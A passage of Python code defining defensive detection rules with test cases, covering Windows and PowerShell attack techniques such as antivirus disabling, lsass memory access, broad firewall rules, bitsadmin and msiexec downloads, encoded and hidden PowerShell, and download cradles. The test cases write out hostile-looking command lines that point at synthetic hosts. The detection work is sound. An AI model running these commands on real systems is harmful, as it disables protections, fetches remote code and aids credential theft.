                            "\\pwsh.exe",
                            "\\cmd.exe",
                            "\\reg.exe",
                            "\\sc.exe",
                        ],
                    )
                ],
            ),
            (
                "selection_weakening_option",
                [
                    (
                        "CommandLine|contains",
                        [
                            "DisableRealtimeMonitoring",
                            "DisableBehaviorMonitoring",
                            "DisableIOAVProtection",
                            "DisableScriptScanning",
                            "DisableAntiSpyware",
                        ],
                    )
                ],
            ),
        ],
        condition="selection_config_tool and selection_weakening_option",
        fps=[
            "Approved troubleshooting sessions where support engineers temporarily disable "
            "real-time scanning to reproduce an application performance issue.",
            "Build and test automation that disables script scanning inside short-lived "
            "continuous integration virtual machines.",
        ],
        fp_strategy=(
            "Benign matches are tied to a change ticket, a support engineer account, and a "
            "short window. Tune with the account and host role, and require that the setting is "
            "restored within the same session."
        ),
        tuning=(
            "Exclude the build automation hosts by name if necessary, and never exclude the "
            "real-time monitoring switch on user endpoints."
        ),
        test_strategy=(
            "Positive cases disable real-time monitoring through the management module and "
            "through a policy registry write. Negative cases enable protection, query the "
            "configuration, and use an unrelated tool."
        ),
        volume="Very low; concentrated on support and build hosts.",
        related=["SDEL-PS-006", "SDEL-WIN-013"],
        pos=[
            case(
                "disable_realtime_monitoring",
                "Management module invoked to disable real-time monitoring.",
                "Tool image and weakening option selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
            case(
                "policy_registry_write",
                "Registry utility used to write a protection-disabling policy value.",
                "Tool image and weakening option selections both match.",
                Image=P_SYS32 + "reg.exe",
                CommandLine=(
                    "reg.exe add HKLM\\Software\\Policies\\SyntheticSecurityProduct "
                    "/v DisableAntiSpyware /t REG_DWORD /d 1 /f"
                ),
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
        ],
        neg=[
            case(
                "enable_realtime_monitoring",
                "Protection re-enabled after a maintenance window.",
                "The switch value differs and the weakening keyword is absent.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Set-MpPreference -EnableControlledFolderAccess Enabled",
            ),
            case(
                "query_protection_status",
                "Protection status queried for reporting.",
                "Tool matches but the command line contains no weakening keyword.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -Command Get-MpComputerStatus",
            ),
            case(
                "documentation_tool_mentions_setting",
                "Documentation generator referencing the setting name in a report path.",
                "The keyword appears but the image is not one of the configuration tools.",
                Image=P_PROG + "SyntheticDocs\\synthetic_docgen.exe",
                CommandLine="synthetic_docgen.exe --topic DisableRealtimeMonitoring",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-012",
        family="windows",
        path="windows/system",
        file="sensitive_authentication_process_access.yml",
        title="Process Access Request Against The Sensitive Authentication Process",
        level="critical",
        profile="win_process_access",
        desc=(
            "Detects a process opening a handle to the local authentication subsystem process "
            "with access rights that permit memory reading. This rule is rated critical because "
            "a successful match is an immediate precursor to credential theft, the benign "
            "population is small and enumerable, and the required response is host isolation "
            "rather than routine triage."
        ),
        hypothesis=(
            "If credential material is harvested from the authentication process, a process "
            "access event will record a handle request that includes memory read rights."
        ),
        techniques=["T1003.001"],
        refs=[attack_url("T1003.001"), MS_SYSMON],
        detection=[
            ("selection_target_process", [("TargetImage|endswith", "\\lsass.exe")]),
            (
                "selection_memory_access",
                [("GrantedAccess", ["0x1010", "0x1410", "0x1438", "0x143a", "0x1fffff"])],
            ),
            (
                "filter_known_security_agent",
                [("SourceImage|endswith", ["\\synthetic_edr_agent.exe", "\\synthetic_backup_agent.exe"])],
            ),
        ],
        condition=(
            "selection_target_process and selection_memory_access and "
            "not filter_known_security_agent"
        ),
        fps=[
            "Endpoint detection agents and backup agents that legitimately inspect the "
            "authentication process, which are excluded by the source image filter.",
            "Crash reporting and memory diagnostic tooling launched by support engineers when "
            "investigating an authentication subsystem hang.",
        ],
        fp_strategy=(
            "The benign population is a short, enumerable list of security and diagnostic "
            "agents. Maintain that list explicitly by source image and review additions, rather "
            "than relaxing the access mask selection."
        ),
        tuning=(
            "Add new agents to the source image filter only after verifying their signature and "
            "installation path. Never widen the filter to a directory prefix such as the whole "
            "program files tree."
        ),
        test_strategy=(
            "Positive cases request two distinct memory read masks from unmanaged source "
            "images. Negative cases cover a low-privilege mask, a different target, and the "
            "filtered security agent."
        ),
        volume="Very low once known agents are filtered.",
        related=["SDEL-ID-008"],
        pos=[
            case(
                "read_access_from_temp_binary",
                "Unmanaged binary in a temporary directory requests memory read access.",
                "Target, access mask, and absence of the agent filter all hold.",
                SourceImage=P_TEMP_USER + "synthetic_dumper.exe",
                TargetImage=P_SYS32 + "lsass.exe",
                GrantedAccess="0x1010",
            ),
            case(
                "extended_access_from_script_host",
                "Script host requests an extended access mask against the authentication process.",
                "Target, access mask, and absence of the agent filter all hold.",
                SourceImage=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                TargetImage=P_SYS32 + "lsass.exe",
                GrantedAccess="0x1438",
            ),
        ],
        neg=[
            case(
                "query_limited_information",
                "Monitoring tool opens the authentication process for limited query rights.",
                "Target matches but the access mask is not in the selection.",
                SourceImage=P_PROG + "SyntheticMonitor\\synthetic_monitor.exe",
                TargetImage=P_SYS32 + "lsass.exe",
                GrantedAccess="0x1000",
            ),
            case(
                "known_security_agent",
                "Endpoint security agent inspects the authentication process.",
                "Target and mask match but the source image filter removes the event.",
                SourceImage=P_PROG + "SyntheticEDR\\synthetic_edr_agent.exe",
                TargetImage=P_SYS32 + "lsass.exe",
                GrantedAccess="0x1410",
            ),
            case(
                "access_to_service_host",
                "Diagnostic tool opens a service host process with a read mask.",
                "Access mask matches but the target process is not the authentication process.",
                SourceImage=P_PROG + "SyntheticMonitor\\synthetic_monitor.exe",
                TargetImage=P_SYS32 + "svchost.exe",
                GrantedAccess="0x1010",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-013",
        family="windows",
        path="windows/defense_evasion",
        file="firewall_rule_created_with_broad_scope.yml",
        title="Host Firewall Rule Created With A Broad Allow Scope",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects host firewall rule creation that allows traffic from any remote address. "
            "Broad allow rules remove a network control that would otherwise constrain lateral "
            "movement and remote access."
        ),
        hypothesis=(
            "If host firewall restrictions are relaxed, the firewall configuration command line "
            "will show an allow action combined with an unrestricted remote address scope."
        ),
        techniques=["T1686"],
        refs=[attack_url("T1686"), MS_NETSH],
        detection=[
            ("selection_firewall_tool", [("Image|endswith", "\\netsh.exe")]),
            ("selection_add_rule", [("CommandLine|contains", "advfirewall firewall add rule")]),
            ("selection_allow_action", [("CommandLine|contains", "action=allow")]),
            (
                "selection_broad_scope",
                [("CommandLine|contains", ["remoteip=any", "localip=any", "profile=any"])],
            ),
        ],
        condition=(
            "selection_firewall_tool and selection_add_rule and selection_allow_action "
            "and selection_broad_scope"
        ),
        fps=[
            "Server build automation that opens an application listening port to any remote "
            "address before a network access control list is applied at the perimeter.",
            "Clustered database or file server roles whose installer creates broad intra-cluster "
            "allow rules during initial configuration.",
        ],
        fp_strategy=(
            "Benign matches happen on server builds, are executed by build service accounts, and "
            "reference a documented application port. Tune on the rule name and port rather than "
            "on the allow action."
        ),
        tuning=(
            "Exclude the specific rule names created by approved build automation on server "
            "hosts. Keep the detection enabled on user endpoints, where broad allow rules are "
            "rarely legitimate."
        ),
        test_strategy=(
            "Positive cases create broad inbound allow rules with two different scope keywords. "
            "Negative cases cover a scoped allow rule, a block rule, and a rule listing command."
        ),
        volume="Low; concentrated during server provisioning.",
        related=["SDEL-WIN-011"],
        pos=[
            case(
                "inbound_any_remote_address",
                "Inbound allow rule created for any remote address.",
                "All four selections match.",
                Image=P_SYS32 + "netsh.exe",
                CommandLine=(
                    "netsh.exe advfirewall firewall add rule name=SyntheticOpenPort "
                    "dir=in action=allow protocol=TCP localport=48080 remoteip=any"
                ),
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
            case(
                "all_profiles_allow_rule",
                "Allow rule created across all firewall profiles.",
                "All four selections match through the profile scope keyword.",
                Image=P_SYS32 + "netsh.exe",
                CommandLine=(
                    "netsh.exe advfirewall firewall add rule name=SyntheticAnyProfile "
                    "dir=in action=allow profile=any protocol=TCP localport=48081"
                ),
                User=f"{HOST_WIN}\\{USER_ADM}",
            ),
        ],
        neg=[
            case(
                "scoped_allow_rule",
                "Allow rule restricted to a documentation subnet.",
                "The broad scope selection does not match a specific remote address.",
                Image=P_SYS32 + "netsh.exe",
                CommandLine=(
                    "netsh.exe advfirewall firewall add rule name=SyntheticScoped dir=in "
                    "action=allow protocol=TCP localport=48080 remoteip=192.0.2.0/24"
                ),
            ),
            case(
                "block_rule_any_remote",
                "Block rule created for any remote address.",
                "The allow action selection does not match.",
                Image=P_SYS32 + "netsh.exe",
                CommandLine=(
                    "netsh.exe advfirewall firewall add rule name=SyntheticBlock dir=in "
                    "action=block protocol=TCP localport=48082 remoteip=any"
                ),
            ),
            case(
                "firewall_rule_listing",
                "Existing firewall rules listed for reporting.",
                "The add rule selection does not match.",
                Image=P_SYS32 + "netsh.exe",
                CommandLine="netsh.exe advfirewall firewall show rule name=all",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-014",
        family="windows",
        path="windows/system",
        file="executable_created_in_public_or_temp_directory.yml",
        title="Executable File Created In A Public Or Temporary Directory",
        level="low",
        profile="win_file_event",
        desc=(
            "Detects creation of an executable or library file inside a user-writable temporary "
            "or public directory. On its own this is weak evidence, so the rule is rated low and "
            "is intended to be paired with the temporary-file-then-execution correlation rule."
        ),
        hypothesis=(
            "If tooling is staged before execution, a file creation event will record an "
            "executable extension written into a user-writable directory."
        ),
        techniques=["T1105"],
        refs=[attack_url("T1105"), MS_SYSMON],
        detection=[
            ("selection_writable_directory", [("TargetFilename|contains", list(TEMP_FRAGMENTS))]),
            (
                "selection_executable_extension",
                [("TargetFilename|endswith", [".exe", ".dll", ".scr"])],
            ),
            ("filter_managed_update_agent", [("Image|endswith", "\\synthetic_update_agent.exe")]),
        ],
        condition=(
            "selection_writable_directory and selection_executable_extension "
            "and not filter_managed_update_agent"
        ),
        fps=[
            "Installer packages that extract their payload binaries into the per-user temporary "
            "directory before running the setup sequence.",
            "The managed update agent staging patch binaries in the Windows temporary directory, "
            "which the rule filter already removes.",
            "Compilers and packaging tools on developer workstations that emit build artefacts "
            "into a temporary scratch directory.",
        ],
        fp_strategy=(
            "This is a staging signal with a large benign population. Use it as correlation "
            "input rather than as a standalone alert, and tune on the writing process image."
        ),
        tuning=(
            "Exclude known installer and packaging images by full path. Do not exclude by file "
            "extension, because that removes the only content constraint in the rule."
        ),
        test_strategy=(
            "Positive cases write an executable and a library into different writable "
            "directories. Negative cases cover a document file, a managed directory, and the "
            "filtered update agent."
        ),
        volume="Moderate; expected to be triaged through correlation rather than individually.",
        related=["SDEL-COR-006", "SDEL-WIN-001"],
        pos=[
            case(
                "executable_in_user_temp",
                "Executable written into the per-user temporary directory.",
                "Directory and extension selections match and no filter applies.",
                TargetFilename=P_TEMP_USER + "synthetic_tool.exe",
                Image=P_SYS32 + "cmd.exe",
            ),
            case(
                "library_in_public_directory",
                "Library written into the public profile directory.",
                "Directory and extension selections match and no filter applies.",
                TargetFilename=P_PUBLIC + "synthetic_component.dll",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
            ),
        ],
        neg=[
            case(
                "document_in_user_temp",
                "Document written into the per-user temporary directory.",
                "Directory matches but the extension selection does not.",
                TargetFilename=P_TEMP_USER + "synthetic_draft.docx",
                Image=P_PROG + "SyntheticOffice\\synthetic_word.exe",
            ),
            case(
                "executable_in_program_files",
                "Executable written into a managed installation directory.",
                "Extension matches but the directory selection does not.",
                TargetFilename=P_PROG + "SyntheticApp\\synthetic_app.exe",
                Image=P_PROG + "SyntheticInstaller\\setup.exe",
            ),
            case(
                "managed_update_agent_staging",
                "Managed update agent stages a patch binary.",
                "Both selections match but the update agent filter removes the event.",
                TargetFilename=P_TEMP_WIN + "synthetic_patch.exe",
                Image=P_PROG + "SyntheticAgent\\synthetic_update_agent.exe",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-015",
        family="windows",
        path="windows/process_creation",
        file="document_viewer_spawning_suspicious_child.yml",
        title="Document Viewer Spawning A Script Or Command Child Process",
        level="high",
        profile="win_process_creation",
        desc=(
            "Detects a synthetic document viewer creating a script host, interpreter, or proxy "
            "execution child process. Viewers render content and should not need to start "
            "interpreters."
        ),
        hypothesis=(
            "If embedded content in a document executes, the resulting process will show the "
            "document viewer as its parent image."
        ),
        techniques=["T1204.002"],
        extra_techniques=["T1059.003"],
        refs=[attack_url("T1204.002"), attack_url("T1059.003"), MS_SYSMON],
        detection=[
            (
                "selection_viewer_parent",
                [
                    (
                        "ParentImage|endswith",
                        ["\\synthetic_pdf_viewer.exe", "\\synthetic_docviewer.exe"],
                    )
                ],
            ),
            (
                "selection_suspicious_child",
                [
                    (
                        "Image|endswith",
                        [
                            "\\cmd.exe",
                            "\\powershell.exe",
                            "\\pwsh.exe",
                            "\\mshta.exe",
                            "\\wscript.exe",
                            "\\rundll32.exe",
                            "\\regsvr32.exe",
                        ],
                    )
                ],
            ),
        ],
        condition="selection_viewer_parent and selection_suspicious_child",
        fps=[
            "Document viewers configured with an external launch action that opens a helper "
            "script for digitally signed internal forms.",
            "Print pipeline integrations where the viewer calls a library host to render a "
            "vendor-specific attachment type.",
        ],
        fp_strategy=(
            "Benign matches are limited to a small number of internal forms and always use the "
            "same helper path. Tune on the child command line and the document being rendered."
        ),
        tuning=(
            "Exclude the exact helper script path used by the internal forms workflow. Do not "
            "exclude the library host image, which is a common proxy execution target."
        ),
        test_strategy=(
            "Positive cases pair the two viewer parents with different children. Negative cases "
            "keep the viewer with a benign child and place a matching child under another parent."
        ),
        volume="Very low; the viewer population is narrow.",
        related=["SDEL-WIN-002"],
        pos=[
            case(
                "pdf_viewer_spawns_powershell",
                "Document viewer launches PowerShell.",
                "Parent and child selections both match.",
                ParentImage=P_PROG + "SyntheticViewer\\synthetic_pdf_viewer.exe",
                ParentCommandLine=(
                    "synthetic_pdf_viewer.exe " + P_USERDIR + "Documents\\synthetic_invoice.pdf"
                ),
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -NoProfile -Command Write-Output 'synthetic'",
            ),
            case(
                "docviewer_spawns_library_host",
                "Document viewer launches the library host utility.",
                "Parent and child selections both match.",
                ParentImage=P_PROG + "SyntheticViewer\\synthetic_docviewer.exe",
                Image=P_SYS32 + "rundll32.exe",
                CommandLine="rundll32.exe " + P_TEMP_USER + "synthetic_component.dll,SyntheticEntry",
            ),
        ],
        neg=[
            case(
                "viewer_spawns_print_helper",
                "Document viewer launches its printing helper.",
                "Parent matches but the child is not in the suspicious list.",
                ParentImage=P_PROG + "SyntheticViewer\\synthetic_pdf_viewer.exe",
                Image=P_PROG + "SyntheticViewer\\synthetic_print_helper.exe",
                CommandLine="synthetic_print_helper.exe /render",
            ),
            case(
                "shell_spawns_library_host",
                "Interactive shell launches the library host utility.",
                "Child matches but the parent is not a document viewer.",
                ParentImage=P_SYS32 + "cmd.exe",
                Image=P_SYS32 + "rundll32.exe",
                CommandLine="rundll32.exe " + P_SYS32 + "shell32.dll,SyntheticEntry",
            ),
            case(
                "viewer_spawns_updater",
                "Document viewer launches its own updater.",
                "Parent matches but the child is a vendor updater.",
                ParentImage=P_PROG + "SyntheticViewer\\synthetic_docviewer.exe",
                Image=P_PROG + "SyntheticViewer\\synthetic_viewer_update.exe",
                CommandLine="synthetic_viewer_update.exe /silent",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-WIN-016",
        family="windows",
        path="windows/system",
        file="system_utility_uncommon_remote_pattern.yml",
        title="System Utility Invoked With An Uncommon Remote Or Transfer Pattern",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects background transfer and installation utilities being invoked with remote "
            "URLs or explicit transfer switches. These utilities are legitimate but are also "
            "convenient signed download channels."
        ),
        hypothesis=(
            "If a signed system utility is used to retrieve remote content, the command line "
            "will contain a URL scheme or an explicit transfer or download switch."
        ),
        techniques=["T1105"],
        refs=[attack_url("T1105"), MS_WINCMD],
        detection=[
            (
                "selection_transfer_utility",
                [
                    (
                        "Image|endswith",
                        [
                            "\\bitsadmin.exe",
                            "\\msiexec.exe",
                            "\\odbcconf.exe",
                            "\\installutil.exe",
                        ],
                    )
                ],
            ),
            ("selection_remote_scheme", [("CommandLine|contains", ["http://", "https://"])]),
            (
                "selection_transfer_switch",
                [("CommandLine|contains", ["/transfer ", "/download ", "-transfer "])],
            ),
        ],
        condition=(
            "selection_transfer_utility and (selection_remote_scheme or selection_transfer_switch)"
        ),
        fps=[
            "Software distribution agents that install packages directly from an internal "
            "package repository over HTTPS.",
            "Background transfer jobs created by the patch management platform to pre-stage "
            "update content on slow links.",
        ],
        fp_strategy=(
            "Benign matches reference internal distribution endpoints and run under management "
            "service accounts. Tune on the destination host portion of the command line together "
            "with the parent process."
        ),
        tuning=(
            "Exclude the internal distribution hostname on managed endpoints. Do not exclude the "
            "background transfer utility itself, which has little other legitimate interactive "
            "use."
        ),
        test_strategy=(
            "Positive cases exercise the remote scheme branch and the transfer switch branch of "
            "the condition separately. Negative cases keep the utilities local and add a "
            "non-matching image with a URL."
        ),
        volume="Low to moderate depending on the software distribution design.",
        related=["SDEL-WIN-004", "SDEL-WIN-005"],
        pos=[
            case(
                "background_transfer_job",
                "Background transfer utility creating a download job.",
                "Utility and transfer switch selections satisfy the condition.",
                Image=P_SYS32 + "bitsadmin.exe",
                CommandLine=(
                    "bitsadmin.exe /transfer SyntheticJob "
                    + SYNTH_URL
                    + "/package.bin "
                    + P_TEMP_WIN
                    + "synthetic_package.bin"
                ),
            ),
            case(
                "installer_remote_package",
                "Installer utility pointed at a synthetic remote package.",
                "Utility and remote scheme selections satisfy the condition.",
                Image=P_SYS32 + "msiexec.exe",
                CommandLine=f"msiexec.exe /i {SYNTH_URL}/package.msi /quiet",
            ),
        ],
        neg=[
            case(
                "local_package_install",
                "Installer utility installing a local package.",
                "Utility matches but neither branch of the condition does.",
                Image=P_SYS32 + "msiexec.exe",
                CommandLine="msiexec.exe /i " + P_PROG + "SyntheticApp\\package.msi /quiet",
            ),
            case(
                "download_manager_with_url",
                "Dedicated download manager retrieving a synthetic file.",
                "Remote scheme matches but the image is not in the utility list.",
                Image=P_PROG + "SyntheticNet\\synthetic_downloader.exe",
                CommandLine=f"synthetic_downloader.exe {SYNTH_URL}/file.bin",
            ),
            case(
                "transfer_utility_job_listing",
                "Background transfer utility listing existing jobs.",
                "Utility matches but there is no remote scheme or transfer switch.",
                Image=P_SYS32 + "bitsadmin.exe",
                CommandLine="bitsadmin.exe /list /allusers",
            ),
        ],
    )
)

# ---------------------------------------------------------------- POWERSHELL (10)

RULES.append(
    rule(
        cid="SDEL-PS-001",
        family="powershell",
        path="powershell",
        file="powershell_encoded_command_option.yml",
        title="PowerShell Invoked With An Encoded Command Option",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects PowerShell being started with the encoded command option. Encoding hides "
            "the executed statement from casual command-line review and is common in both "
            "automation and intrusion activity."
        ),
        hypothesis=(
            "If a caller wants to hide the executed statement, the PowerShell command line will "
            "contain an encoded command switch followed by an opaque string."
        ),
        techniques=["T1059.001"],
        extra_techniques=["T1027"],
        refs=[attack_url("T1059.001"), attack_url("T1027"), MS_PS_LOGGING],
        detection=[
            ("selection_powershell", [("Image|endswith", ["\\powershell.exe", "\\pwsh.exe"])]),
            (
                "selection_encoded_option",
                [("CommandLine|contains", ["-EncodedCommand", "-enc ", "-ec ", "/EncodedCommand"])],
            ),
        ],
        condition="selection_powershell and selection_encoded_option",
        fps=[
            "Configuration management platforms that wrap remediation scripts in an encoded "
            "command to avoid quoting problems in their agent transport.",
            "Software packaging systems that generate encoded install and uninstall commands "
            "when publishing applications.",
        ],
        fp_strategy=(
            "Benign encoded commands originate from a handful of management agents and always "
            "have the same parent process. Tune on ParentImage plus the invoking account, not on "
            "the encoded switch."
        ),
        tuning=(
            "Exclude the management agent parent image on managed endpoints. Do not exclude the "
            "encoded command switch, and prefer decoding the command in the pipeline for review."
        ),
        test_strategy=(
            "Positive cases use the long and short forms of the switch with a synthetic "
            "placeholder string. Negative cases cover an ordinary command, a file-based script, "
            "and a different binary."
        ),
        volume="Moderate where configuration management is heavily used.",
        related=["SDEL-PS-009", "SDEL-PS-002"],
        pos=[
            case(
                "long_form_encoded_switch",
                "PowerShell started with the long encoded command switch.",
                "Interpreter and encoded option selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=f"powershell.exe -NoProfile -EncodedCommand {ENC_PLACEHOLDER}",
            ),
            case(
                "short_form_encoded_switch",
                "PowerShell started with the short encoded command switch.",
                "Interpreter and encoded option selections both match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=f"powershell.exe -nop -w hidden -enc {ENC_PLACEHOLDER}",
            ),
        ],
        neg=[
            case(
                "plain_command",
                "PowerShell started with a readable command.",
                "Interpreter matches but no encoded option is present.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine="powershell.exe -NoProfile -Command Get-Service -Name SyntheticAgent",
            ),
            case(
                "script_file_execution",
                "PowerShell executing an approved script file.",
                "Interpreter matches but the argument is a file path.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -ExecutionPolicy AllSigned -File "
                    + P_PROG
                    + "SyntheticAgent\\inventory.ps1"
                ),
            ),
            case(
                "other_tool_encoded_argument",
                "Unrelated utility using a similarly named argument.",
                "The option text matches but the image is not PowerShell.",
                Image=P_PROG + "SyntheticApp\\synthetic_cli.exe",
                CommandLine=f"synthetic_cli.exe -enc {ENC_PLACEHOLDER}",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-002",
        family="powershell",
        path="powershell",
        file="powershell_hidden_window_with_suspicious_options.yml",
        title="PowerShell Hidden Window Combined With Policy Or Profile Bypass Options",
        level="medium",
        profile="win_process_creation",
        desc=(
            "Detects PowerShell started with a hidden window together with options that skip the "
            "user profile or relax the execution policy. The combination indicates deliberate "
            "concealment from the interactive user."
        ),
        hypothesis=(
            "If PowerShell is executed without user awareness, the command line will combine a "
            "hidden window style with profile or policy suppression options."
        ),
        techniques=["T1059.001"],
        refs=[attack_url("T1059.001"), MS_PS_LOGGING],
        detection=[
            ("selection_powershell", [("Image|endswith", ["\\powershell.exe", "\\pwsh.exe"])]),
            (
                "selection_hidden_window",
                [("CommandLine|contains", ["-WindowStyle Hidden", "-w hidden", "-windowstyle hidden"])],
            ),
            (
                "selection_bypass_options",
                [
                    (
                        "CommandLine|contains",
                        ["-ExecutionPolicy Bypass", "-ep bypass", "-NoProfile", "-nop "],
                    )
                ],
            ),
        ],
        condition="selection_powershell and selection_hidden_window and selection_bypass_options",
        fps=[
            "Logon scripts distributed by group policy that intentionally run hidden so that no "
            "console window appears for the user.",
            "Endpoint agent health checks that run hidden every hour with a bypassed execution "
            "policy because the scripts are unsigned by design.",
        ],
        fp_strategy=(
            "Benign matches repeat on a fixed schedule with the same parent process and script "
            "path. Tune on the script path in the command line and the parent, keeping the "
            "hidden window condition intact."
        ),
        tuning=(
            "Exclude the specific logon script path rather than the hidden window option. "
            "Removing the hidden option collapses the rule into a generic PowerShell rule."
        ),
        test_strategy=(
            "Positive cases combine hidden execution with policy bypass and with profile "
            "suppression. Negative cases drop one of the required halves."
        ),
        volume="Low to moderate depending on logon script design.",
        related=["SDEL-PS-001"],
        pos=[
            case(
                "hidden_with_policy_bypass",
                "Hidden PowerShell with a relaxed execution policy.",
                "All three selections match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "
                    + P_TEMP_USER
                    + "synthetic_task.ps1"
                ),
            ),
            case(
                "hidden_with_profile_suppression",
                "Hidden PowerShell with the user profile suppressed.",
                "All three selections match through the short option forms.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=f"powershell.exe -w hidden -nop -enc {ENC_PLACEHOLDER}",
            ),
        ],
        neg=[
            case(
                "hidden_only",
                "Hidden PowerShell without any bypass option.",
                "The bypass selection does not match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -WindowStyle Hidden -File "
                    + P_PROG
                    + "SyntheticAgent\\healthcheck.ps1"
                ),
            ),
            case(
                "bypass_only",
                "Visible PowerShell with a relaxed execution policy.",
                "The hidden window selection does not match.",
                Image=P_SYS32 + "WindowsPowerShell\\v1.0\\powershell.exe",
                CommandLine=(
                    "powershell.exe -ExecutionPolicy Bypass -File "
                    + P_PROG
                    + "SyntheticAgent\\healthcheck.ps1"
                ),
            ),
            case(
                "other_shell_hidden",
                "Command interpreter started minimised.",
                "The interpreter selection does not match.",
                Image=P_SYS32 + "cmd.exe",
                CommandLine="cmd.exe /c start /min synthetic_task.bat",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-003",
        family="powershell",
        path="powershell",
        file="powershell_download_oriented_command_pattern.yml",
        title="PowerShell Script Block Containing A Download Command Pattern",
        level="medium",
        profile="win_ps_script",
        desc=(
            "Detects script block content that retrieves remote content through the common "
            "PowerShell download methods. The rule matches method names in logged script text, "
            "not network activity."
        ),
        hypothesis=(
            "If PowerShell is used to retrieve remote content, the logged script block will "
            "contain one of the standard download method names together with a URL scheme."
        ),
        techniques=["T1105"],
        extra_techniques=["T1059.001"],
        refs=[attack_url("T1105"), attack_url("T1059.001"), MS_PS_LOGGING],
        detection=[
            (
                "selection_download_method",
                [
                    (
                        "ScriptBlockText|contains",
                        [
                            "DownloadString",
                            "DownloadFile",
                            "Invoke-WebRequest",
                            "Invoke-RestMethod",
                            "Start-BitsTransfer",
                        ],
                    )
                ],
            ),
            ("selection_remote_scheme", [("ScriptBlockText|contains", ["http://", "https://"])]),
        ],
        condition="selection_download_method and selection_remote_scheme",
        fps=[
            "Internal automation modules that fetch configuration manifests from an approved "
            "internal web service at the start of every run.",
            "Package bootstrap scripts on build agents that download dependencies from an "
            "internal artefact repository.",
        ],
        fp_strategy=(
            "Benign matches always reference internal endpoints and run under automation "
            "accounts. Tune on the destination host inside the script text plus the host role."
        ),
        tuning=(
            "Exclude the internal artefact repository hostname. Do not exclude the download "
            "method names, since they are the behavioural core of the rule."
        ),
        test_strategy=(
            "Positive cases use two different download methods with the synthetic invalid "
            "domain. Negative cases keep a download method without a URL and a URL without a "
            "download method."
        ),
        volume="Moderate on build agents; low on user endpoints.",
        related=["SDEL-PS-009", "SDEL-WIN-016"],
        pos=[
            case(
                "webclient_download_string",
                "Script block using the web client download method.",
                "Download method and remote scheme selections both match.",
                ScriptBlockText=(
                    "$client = New-Object System.Net.WebClient; "
                    f"$data = $client.DownloadString('{SYNTH_URL}/manifest.txt')"
                ),
            ),
            case(
                "invoke_web_request",
                "Script block using the web request cmdlet.",
                "Download method and remote scheme selections both match.",
                ScriptBlockText=(
                    f"Invoke-WebRequest -Uri '{SYNTH_URL}/manifest.txt' -OutFile "
                    f"'{P_TEMP_USER}synthetic_manifest.txt'"
                ),
            ),
        ],
        neg=[
            case(
                "local_file_read",
                "Script block reading a local manifest file.",
                "Neither selection matches.",
                ScriptBlockText=f"Get-Content -Path '{P_PROG}SyntheticAgent\\manifest.txt'",
            ),
            case(
                "download_method_local_path",
                "Script block copying a file from an internal file share path.",
                "Download method matches but there is no URL scheme.",
                ScriptBlockText=(
                    "$client = New-Object System.Net.WebClient; "
                    "$client.DownloadFile('\\\\SYNTHETIC-HOST-01\\share\\manifest.txt', "
                    f"'{P_TEMP_USER}manifest.txt')"
                ),
            ),
            case(
                "url_in_comment",
                "Script block containing a documentation URL in a comment.",
                "Remote scheme matches but no download method is present.",
                ScriptBlockText=f"# Reference: {SYNTH_URL}/docs\nGet-Date | Out-String",
            ),
        ],
    )
)

RULES.append(
    rule(
        cid="SDEL-PS-004",
        family="powershell",
        path="powershell",
        file="powershell_reflective_loading_terminology.yml",
        title="PowerShell Script Block Containing Reflective Loading Terminology",
        level="high",
        profile="win_ps_script",
        desc=(
            "Detects script block text that references in-memory assembly loading and dynamic "
            "invocation constructs. The rule matches terminology in logged script text only and "
            "contains no working loader code."
        ),
        hypothesis=(
            "If code is loaded reflectively to avoid writing a file to disk, the logged script "
            "block will contain assembly loading and dynamic invocation terminology."
        ),
        techniques=["T1620"],
        extra_techniques=["T1059.001"],
        refs=[attack_url("T1620"), attack_url("T1059.001"), MS_PS_LOGGING],
        detection=[
            (
                "selection_reflection_terms",
                [
                    (
                        "ScriptBlockText|contains",
                        [
                            "[Reflection.Assembly]::Load",
                            "System.Reflection.Assembly]::Load",
                            "Reflection.Emit",
                            "GetDelegateForFunctionPointer",
                        ],
                    )
                ],
            )
        ],
        condition="selection_reflection_terms",
        fps=[
            "Internal developer tooling that loads a signed helper assembly from a byte array "
            "during unit test bootstrapping.",
            "Vendor management modules that dynamically emit interop types when talking to a "
            "legacy component.",
        ],
        fp_strategy=(
            "Benign matches come from a small number of engineering and vendor modules with "
            "stable script paths. Tune on the Path field and the executing host role."
        ),
        tuning=(
            "Exclude the specific module path on build hosts only. Excluding the assembly load "
            "terminology globally removes the entire detection."
        ),
